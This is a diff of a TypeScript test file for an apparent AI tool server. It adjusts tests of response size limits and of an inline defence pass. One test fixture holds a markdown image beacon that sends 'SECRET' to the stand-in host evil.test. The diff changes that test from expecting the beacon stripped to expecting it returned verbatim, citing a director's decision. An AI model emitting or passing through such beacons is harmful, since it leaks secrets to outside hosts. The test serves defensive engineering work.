@@ -104,8 +104,7 @@ const HEADER_BLOCK = "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\n\r\n"
  * Pull the JSON body out of a plain-branch response that also reported headers
  * — and **assert the two arrived as separate content entries first.**
  *
- * The header block used to be prefixed to the body inside one entry, and this
- * helper asserted that prefix. `docs/todos/018` separated them: one entry per
+ * One entry per
  * remote-controlled region (ARCHITECTURE.md invariant 13), because a single
  * entry spanning both is a defence pass whose input spans two regions —
  * invariant 16's stated violation, and the one that deleted a field between a
@@ -842,8 +841,11 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             // so the JSON fixture stayed under the cap, took the inline arm, and
             // the case had no saved message to read. The subject is unchanged:
             // whether the two numbers in that message can be reconciled.
-            const body = "[](file:)".repeat(100);
-            mockedExecuteCommand.mockResolvedValue(curlOutput(body, "text/markdown"));
+            // A JSON body over the cap, because that is the only arm that
+            // produces the limit sentence: a non-JSON body is saved whether or
+            // not it crossed the cap, so it reports no limit to reconcile.
+            const body = JSON.stringify({ v: "z".repeat(1200) });
+            mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));
 
             const handlers = registerViaShippedPath();
             const text = textOf(
@@ -862,20 +864,10 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             const limit = Number(/(\d+)-byte inline limit/.exec(text)?.[1]);
             expect(Number.isFinite(reported)).toBe(true);
             expect(limit).toBe(1000);
-            // **The relation INVERTED with `docs/todos/018`, and the inversion
-            // is the point rather than a loosened assertion.**
-            //
-            // This used to assert `reported < limit`, because the two numbers
-            // measured different things: the gate weighed the DEFENDED form
-            // while the message reported the artefact, which was the undefended
-            // body. That is the sentence a reader could not reconcile, and the
-            // qualifier existed to make it readable.
-            //
-            // After 018 they are the same quantity on both arms — a JSON
-            // artefact is the origin octets and the defence cannot grow a JSON
-            // body, and a non-JSON artefact IS the defended text. So a reported
-            // count below the limit it says was exceeded is no longer
-            // constructible, and the guard is the stronger direction.
+            // **The relation is `reported >= limit`, not the reverse.** Both
+            // numbers are now the same quantity: the artefact is the origin's
+            // octets and no defence pass grows a JSON body, so a reported count
+            // below the limit it says was exceeded is not constructible.
             expect(reported).toBeGreaterThanOrEqual(limit);
             expect(text).toContain("once the inline defence pass is applied");
         });
@@ -967,7 +959,11 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             expect(text).toContain(expected);
         });
 
-        it("strips a markdown beacon from a queried JSON file", async () => {
+        it("returns a queried JSON file's beacon verbatim (RC-10 reversed)", async () => {
+            // The filter returns a string leaf, which parses — so the wrap takes
+            // `defendForInline`'s verbatim arm. Settled by the director on the
+            // population: internal staff reading their own API data.
+            // `LESSONS.md` RC-47.
             const file = join(dir, "saved.json");
             await writeFile(file, '{"note":"![x](https://evil.test/?d=SECRET)"}', "utf-8");
 
@@ -979,9 +975,7 @@ describe("registerAllTools — the shipped binary's registration path", () => {
                 )
             );
 
-            expect(text).toContain("[image removed]");
-            expect(text).not.toContain("evil.test");
-            expect(text).not.toContain("SECRET");
+            expect(text).toBe(JSON.stringify("![x](https://evil.test/?d=SECRET)"));
         });
 
         // Settles the instance `docs/todos/012` recorded as SUSPECTED rather
